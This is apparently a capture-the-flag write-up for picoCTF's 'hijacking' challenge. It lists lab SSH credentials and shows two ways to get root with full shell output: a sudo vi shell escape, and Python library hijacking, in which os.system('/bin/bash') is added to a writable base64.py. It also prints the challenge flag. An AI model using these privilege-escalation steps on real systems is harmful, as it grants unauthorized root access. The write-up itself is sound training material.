# hijacking
Getting root access can allow you to read the flag. Luckily there is a python file that you might like to play with. (200 Points)
Through Social engineering, we've got the credentials to use on the server. SSH is running on the server.
saturn.picoctf.net 55719
Username: picoctf
Password: rZSsB--vJK

## Solution
If we take a quick look at the system we can find the following sudo rights
```
picoctf@challenge:~$ sudo -l
Matching Defaults entries for picoctf on challenge:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User picoctf may run the following commands on challenge:
    (ALL) /usr/bin/vi
    (root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py
picoctf@challenge:~$
```

Im not sure if this challenge is supposed to do so, but with the sudo rights for 'vi' you just can execute it with sudo rights and than call commands or directly a shell inside vi:
```
picoctf@challenge:~$ sudo vi
[sudo] password for picoctf:

[INSIDE VIM -> :shell]

root@challenge:/home/picoctf# id
uid=0(root) gid=0(root) groups=0(root)
root@challenge:/home/picoctf# ls -al /root/
total 12
drwx------ 1 root root   23 Mar 16 02:08 .
drwxr-xr-x 1 root root   51 Mar 27 14:10 ..
-rw-r--r-- 1 root root 3106 Dec  5  2019 .bashrc
-rw-r--r-- 1 root root   43 Mar 16 02:08 .flag.txt
-rw-r--r-- 1 root root  161 Dec  5  2019 .profile
root@challenge:/home/picoctf# cat /root/.flag.txt
picoCTF{pYth0nn_libraryH!j@CK!n9_6924176e}
root@challenge:/home/picoctf#
```

But i dont think that this is the way it was intended. The more relevant part of the sudo rights is `(root) NOPASSWD: /usr/bin/python3 /home/picoctf/.server.py`. With this we can execute the python script in our home directory with sudo rights:
```
picoctf@challenge:~$ ls -al
total 16
drwxr-xr-x 1 picoctf picoctf   20 Mar 27 14:11 .
drwxr-xr-x 1 root    root      21 Mar 16 02:08 ..
-rw-r--r-- 1 picoctf picoctf  220 Feb 25  2020 .bash_logout
-rw-r--r-- 1 picoctf picoctf 3771 Feb 25  2020 .bashrc
drwx------ 2 picoctf picoctf   34 Mar 27 14:11 .cache
-rw-r--r-- 1 picoctf picoctf  807 Feb 25  2020 .profile
-rw-r--r-- 1 root    root     375 Mar 16 01:30 .server.py
picoctf@challenge:~$ cat .server.py
import base64
import os
import socket
ip = 'picoctf.org'
response = os.system("ping -c 1 " + ip)
#saving ping details to a variable
host_info = socket.gethostbyaddr(ip)
#getting IP from a domaine
host_info_to_str = str(host_info[2])
host_info = base64.b64encode(host_info_to_str.encode('ascii'))
print("Hello, this is a part of information gathering",'Host: ', host_info)
picoctf@challenge:~$
```

But it doesnt bring any advantage, because we cant edit the script. But maybe we can manipulate some of the libraries. So checking it out:
```
picoctf@challenge:~$ find / | grep python | grep -i -E "base64.py|os.py|socket.py"
[...]
/usr/lib/python3.8/base64.py
/usr/lib/python3.8/os.py
/usr/lib/python3.8/socket.py
picoctf@challenge:~$ ls -al /usr/lib/python3.8/base64.py /usr/lib/python3.8/os.py /usr/lib/python3.8/socket.py
-rwxrwxrwx 1 root root 20382 Nov 14 12:59 /usr/lib/python3.8/base64.py
-rw-r--r-- 1 root root 38995 Nov 14 12:59 /usr/lib/python3.8/os.py
-rw-r--r-- 1 root root 35243 Nov 14 12:59 /usr/lib/python3.8/socket.py
picoctf@challenge:~$
```

We have the full rights to edit the base64.py module. We can add the following lines to escalated our privs:
```
picoctf@challenge:~$ vim /usr/lib/python3.8/base64.py
import re
import struct
import binascii

+ import os
+ os.system('/bin/bash')


__all__ = [
[...]
```

After that execute the python script with sudo rights to get a root shell:
```
picoctf@challenge:~$ sudo /usr/bin/python3 /home/picoctf/.server.py
root@challenge:/home/picoctf# id
uid=0(root) gid=0(root) groups=0(root)
root@challenge:/home/picoctf# cat /root/.flag.txt
picoCTF{pYth0nn_libraryH!j@CK!n9_6924176e}
root@challenge:/home/picoctf#
```
